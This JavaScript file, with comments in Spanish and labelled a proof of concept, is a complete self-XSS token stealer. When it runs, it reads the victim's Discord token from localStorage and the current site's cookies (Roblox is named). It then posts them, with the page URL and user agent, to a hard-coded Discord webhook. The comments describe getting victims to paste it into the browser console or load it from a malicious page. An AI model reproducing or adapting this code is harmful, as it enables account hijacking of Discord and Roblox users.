/*
 * =====================================================================================
 * PRUEBA DE CONCEPTO (POC) - AUTO-XSS VIA ENLACE
 * =====================================================================================
 * PROPÓSITO: Demostrar cómo un enlace malicioso puede ejecutar JavaScript
 * para robar el token de Discord y las cookies de Roblox.
 *
 * Este script está diseñado para ser inyectado en la consola del navegador
 * o ejecutado a través de una página HTML maliciosa.
 * =====================================================================================
 */

// --- CONFIGURACIÓN ---
// Reemplaza esta URL con la de tu webhook de Discord de prueba.
const WEBHOOK_URL = "https://discord.com/api/webhooks/1454234349733023846/DqBPO7cTvMxAdCb-iv1hk6VBL7Foh-OAtC5kDYA29pYmMH3RxdLYOwfhR9ZwivQA84qe";

// --- FUNCIONES DE ROBO DE DATOS ---

/**
 * Roba el token de Discord directamente desde localStorage.
 * Esto funciona si el script se ejecuta mientras el usuario está en discord.com
 * o en una página que tenga acceso al localStorage de Discord (muy raro, pero posible).
 * La forma más común es que el usuario pegue esto en la consola de Discord.
 */
function robarTokenDiscord() {
    try {
        const token = localStorage.getItem('token');
        if (token) {
            console.log("[POC XSS] Token de Discord encontrado.");
            return token;
        }
    } catch (e) {
        console.error("[POC XSS] No se pudo acceder al localStorage:", e);
    }
    return "No se encontró el token de Discord (ejecuta en discord.com).";
}

/**
 * Roba todas las cookies del dominio actual.
 * Si el usuario ejecuta el script en roblox.com, robará las cookies de Roblox.
 */
function robarCookiesDominioActual() {
    try {
        const cookies = document.cookie;
        if (cookies) {
            console.log("[POC XSS] Cookies encontradas.");
            return cookies;
        }
    } catch (e) {
        console.error("[POC XSS] No se pudo acceder a las cookies:", e);
    }
    return "No se encontraron cookies.";
}

/**
 * Envía los datos recolectados al webhook de Discord.
 */
function enviarADiscord(titulo, datos) {
    const payload = {
        content: `**[POC XSS]** ${titulo}`,
        username: "XSS Link Logger",
        embeds: [{
            title: "Datos Robados (Demo)",
            description: "```json\n" + JSON.stringify(datos, null, 2) + "\n```",
            color: 16711680 // Rojo
        }]
    };

    fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    })
    .then(response => {
        if (response.ok) {
            console.log("[POC XSS] Datos enviados exitosamente a Discord.");
            // Mensaje sutil para que el usuario sepa que algo ocurrió
            document.body.style.backgroundColor = "lightcoral";
            document.title = "¡Datos Robados!";
        } else {
            console.error("[POC XSS] Error al enviar a Discord:", response.statusText);
        }
    })
    .catch(error => console.error("[POC XSS] Error de red:", error));
}

// --- EJECUCIÓN PRINCIPAL ---
function ejecutarRobo() {
    console.log("[POC XSS] Iniciando robo de datos...");

    const datosRobados = {
        discord_token: robarTokenDiscord(),
        roblox_cookies: robarCookiesDominioActual(), // Funciona si se ejecuta en roblox.com
        url_actual: window.location.href,
        user_agent: navigator.userAgent
    };

    enviarADiscord("¡Datos robados vía XSS!", datosRobados);
}

// Iniciar el proceso

ejecutarRobo();
